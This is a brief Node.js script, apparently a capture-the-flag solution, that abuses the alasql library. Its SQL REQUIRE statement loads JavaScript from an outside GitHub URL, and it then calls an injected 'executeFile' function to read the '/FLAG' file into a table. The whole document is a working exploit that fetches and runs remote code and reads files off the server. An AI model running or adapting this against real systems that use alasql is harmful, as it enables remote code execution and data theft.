const alasql = require('alasql');

alasql('REQUIRE "https://raw.githubusercontent.com/vr2/1/refs/heads/main/flag.js"');

alasql('CREATE TABLE genie (content TEXT)');
alasql.tables.genie.data = [
    {content:"test"}
];

alasql('INSERT INTO genie VALUES (executeFile("/FLAG"))');
